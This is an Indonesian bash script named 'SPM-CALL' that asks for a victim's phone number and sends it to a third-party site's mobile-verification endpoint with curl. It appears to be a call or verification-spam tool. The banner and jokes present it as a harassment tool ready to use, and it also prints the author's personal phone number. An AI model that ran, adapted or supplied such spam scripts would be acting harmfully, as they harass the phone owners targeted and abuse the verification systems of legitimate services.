#!bin/bash 
 clear
 sleep 1
 echo
 echo "( UDAH SUBCRIBE BELUM GAN )" | lolcat
 read -p "udh/blm : " udh
 echo "okeh ternyata kamu $udh toh okeh" | lolcat
 clear
 echo
 figlet SPM-CALL | lolcat
 sleep 1
     echo "===============================================" | lolcat
     echo "(+)  AUTHOR  = Andi Andrian                 (+)" | lolcat
     echo "(+)  Channel = Budjank Channel              (+)" | lolcat
     echo "(+)  KONTAK  = +62 8212-1033-609            (+)" | lolcat
     echo "===============================================" | lolcat
         sleep 1
 echo "# GUNAKAN DENGAN BIJAK GAN :)" | lolcat
 sleep 1
 echo "# JANGAN CALL NOMOR GW ATO GW LEDAKIN HP ELU _-" | lolcat
 echo
 sleep 1
     echo "[1] MULAI SEKARANG" | lolcat
     sleep 1
     echo "[2] KELUAR AJAH" | lolcat
     echo
     read -p "gas pilih yang mana stah = " Budjank
     if [[ $Budjank = 1 ]]; then
     echo
     echo "MASUKAN NOMOT TARGET GAN ( CONTOH = 88219876908 )" | lolcat
     read -p "=> " nomor
     link="https://id.jagreward.com/member/verify-mobile/$nomor"
     curl -s $link
     else
     echo 'tanks bro udh pake script ane :)' | lolcat
     exit
      fi
     echo